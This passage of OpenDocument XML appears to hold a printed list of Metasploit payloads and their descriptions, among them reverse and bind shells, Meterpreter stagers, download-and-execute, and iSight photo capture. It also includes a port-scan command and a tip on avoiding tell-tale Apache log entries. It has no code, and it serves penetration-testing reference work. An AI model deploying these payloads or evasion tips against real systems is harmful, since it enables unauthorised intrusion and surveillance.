      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/read_file <text:s text:c="13"/>Read up to 4096 bytes from the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>local file system and write it</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back out to the specified file</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>descriptor</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/bind_ipv6_tcp <text:s text:c="3"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for an IPv6 connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/bind_ipv6_tcp_u <text:s/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="30"/>Listen for an IPv6 connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with UUID Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/bind_nonx_tcp <text:s text:c="3"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>linux/x86/shell/bind_tcp <text:s text:c="8"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection (Linux</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/bind_tcp_uuid <text:s text:c="3"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection with U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UID Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/find_tag <text:s text:c="8"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Use an established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/reverse_ipv6_tc <text:s/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="32"/>Connect back to attacker over</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/reverse_nonx_tc <text:s/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="32"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/reverse_tcp <text:s text:c="5"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell/reverse_tcp_uui <text:s/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d <text:s text:c="32"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_bind_ipv6_tcp <text:s text:c="3"/>Listen for a connection over IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_bind_tcp <text:s text:c="8"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_bind_tcp_random <text:s/>Listen for a connection in a ra</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_port <text:s text:c="27"/>ndom port and spawn a command s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hell. Use nmap to discover the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>open port: 'nmap -sS target -p-</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_find_port <text:s text:c="7"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_find_tag <text:s text:c="8"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/shell_reverse_tcp_ipv <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>6 <text:s text:c="31"/>awn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/zarch/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/zarch/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/zarch/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>mainframe/shell_reverse_tcp <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell. This implem</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>entation does not include ebcdi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>c character translation, so a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lient with translation capabili</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ties is required. MSF handles t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>his automatically.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>multi/meterpreter/reverse_http <text:s text:c="2"/>Handle Meterpreter sessions reg</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ardless of the target arch/plat</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>form. Tunnel communication over</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>multi/meterpreter/reverse_https <text:s/>Handle Meterpreter sessions reg</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ardless of the target arch/plat</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>form. Tunnel communication over</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>HTTPS</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>netware/shell/reverse_tcp <text:s text:c="7"/>Connect to the NetWare console</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(staged). Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nodejs/shell_bind_tcp <text:s text:c="11"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a nodejs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nodejs/shell_reverse_tcp <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a nodejs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nodejs/shell_reverse_tcp_ssl <text:s text:c="4"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a nodejs, uses SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/aarch64/meterpreter/reverse <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/aarch64/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/aarch64/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/aarch64/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/execute/bind_tcp <text:s text:c="6"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/execute/reverse_tcp <text:s text:c="3"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/shell/bind_tcp <text:s text:c="8"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/shell/reverse_tcp <text:s text:c="5"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/shell_bind_tcp <text:s text:c="8"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/shell_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/armle/vibrate <text:s text:c="15"/>Causes the iPhone to vibrate, o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nly works when the AudioToolkit</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>library has been loaded. Based</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>on work by Charlie Miller &lt;cmi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ller[at]securityevaluators.com&gt;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/ppc/shell/bind_tcp <text:s text:c="10"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/ppc/shell/find_tag <text:s text:c="10"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Use an established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/ppc/shell/reverse_tcp <text:s text:c="7"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/ppc/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/ppc/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/dupandexecve/bind_tcp <text:s text:c="3"/>dup2 socket in edi, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Listen, read length, read buf</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>fer, execute</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>osx/x64/dupandexecve/reverse_tc <text:s/>dup2 socket in edi, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>. Connect, read length, read bu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ffer, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/dupandexecve/reverse_tc <text:s/>dup2 socket in edi, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_uuid <text:s text:c="26"/>. Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with UUID Support (OSX x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/exec <text:s text:c="20"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter/bind_tcp <text:s text:c="4"/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (staged). Listen, read length</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>, read buffer, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter/reverse_tcp <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (staged). Connect, read lengt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h, read buffer, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter/reverse_tcp <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_uuid <text:s text:c="27"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker with UUID Support (OS</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>X x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter_reverse_htt <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter_reverse_htt <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps <text:s text:c="30"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/meterpreter_reverse_tcp <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/say <text:s text:c="21"/>Say an arbitrary string outloud</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>using Mac OS X text2speech</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/shell_bind_tcp <text:s text:c="10"/>Bind an arbitrary command to an</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>arbitrary port</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/shell_find_tag <text:s text:c="10"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x64/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/bundleinject/bind_tcp <text:s text:c="3"/>Inject a custom Mach-O bundle i</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nto the exploited process. List</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>en, read length, read buffer, e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>xecute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/bundleinject/reverse_tc <text:s/>Inject a custom Mach-O bundle i</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>nto the exploited process. Conn</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ect, read length, read buffer,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/exec <text:s text:c="20"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/isight/bind_tcp <text:s text:c="9"/>Inject a Mach-O bundle to captu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>re a photo from the iSight (sta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ged). Listen, read length, read</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>buffer, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/isight/reverse_tcp <text:s text:c="6"/>Inject a Mach-O bundle to captu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>re a photo from the iSight (sta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ged). Connect, read length, rea</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d buffer, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/shell_find_port <text:s text:c="9"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>osx/x86/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/vforkshell/bind_tcp <text:s text:c="5"/>Call vfork() if necessary and s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Listen, read length, read buffe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/vforkshell/reverse_tcp <text:s text:c="2"/>Call vfork() if necessary and s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Connect, read length, read buff</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er, execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/vforkshell_bind_tcp <text:s text:c="5"/>Listen for a connection, vfork</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>if necessary, and spawn a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>osx/x86/vforkshell_reverse_tcp <text:s text:c="2"/>Connect back to attacker, vfork</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>if necessary, and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/bind_perl <text:s text:c="19"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl (pe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rsistent)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/bind_perl_ipv6 <text:s text:c="14"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl (pe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rsistent) over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/bind_php <text:s text:c="20"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via php</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/bind_php_ipv6 <text:s text:c="15"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via php (IPv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>6)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/download_exec <text:s text:c="15"/>Download an EXE from an HTTP UR</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>L and execute it</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/exec <text:s text:c="24"/>Execute a single system command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/bind_tcp <text:s text:c="8"/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/bind_tcp_ipv6 <text:s text:c="3"/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Listen for a connection over</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/bind_tcp_ipv6_u <text:s/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="29"/>. Listen for a connection over</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6 with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/bind_tcp_uuid <text:s text:c="3"/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Listen for a connection with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/reverse_tcp <text:s text:c="5"/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Reverse PHP connect back stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er with checks for disabled fun</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ctions</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter/reverse_tcp_uui <text:s/>Run a meterpreter server in PHP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d <text:s text:c="31"/>. Reverse PHP connect back stag</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er with checks for disabled fun</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ctions</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/meterpreter_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a Meterpreter server (PHP)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/reverse_perl <text:s text:c="16"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>a perl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/reverse_php <text:s text:c="17"/>Reverse PHP connect back shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with checks for disabled functi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ons</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>php/shell_findsock <text:s text:c="14"/>Spawn a shell on the establishe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d connection to the webserver.</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Unfortunately, this payload can</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>leave conspicuous evil-looking</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>entries in the apache error lo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>gs, so it is probably a good id</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ea to use a bind or reverse she</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ll unless firewalls prevent the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>m from working. The issue this</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>payload takes advantage of (CLO</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>EXEC flag not set on sockets) a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ppears to have been patched on</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the Ubuntu version of Apache an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d may not work on other Debian-</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>based distributions. Only teste</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d on Apache but it might work o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n other web servers that leak f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ile descriptors to child proces</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ses.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/bind_tcp <text:s text:c="5"/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/bind_tcp_uui <text:s/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d <text:s text:c="31"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/reverse_http <text:s/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/reverse_http <text:s/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>s <text:s text:c="31"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r HTTP using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/reverse_tcp <text:s text:c="2"/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/reverse_tcp_ <text:s/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ssl <text:s text:c="29"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Reverse Python connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack stager using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter/reverse_tcp_ <text:s/>Run a meterpreter server in Pyt</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uuid <text:s text:c="28"/>hon (compatible with 2.5-2.7 &amp;</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>3.1+). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter_bind_tcp <text:s text:c="5"/>Connect to the victim and spawn</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>python/meterpreter_reverse_http <text:s/>Connect back to the attacker an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter_reverse_http <text:s/>Connect back to the attacker an</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>s <text:s text:c="31"/>d spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/meterpreter_reverse_tcp <text:s text:c="2"/>Connect back to the attacker an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/pingback_bind_tcp <text:s text:c="8"/>Listens for a connection from t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker, sends a UUID, then</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/pingback_reverse_tcp <text:s text:c="5"/>Connects back to the attacker,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sends a UUID, then terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/shell_bind_tcp <text:s text:c="11"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Python, encodes with base64 b</text:p>
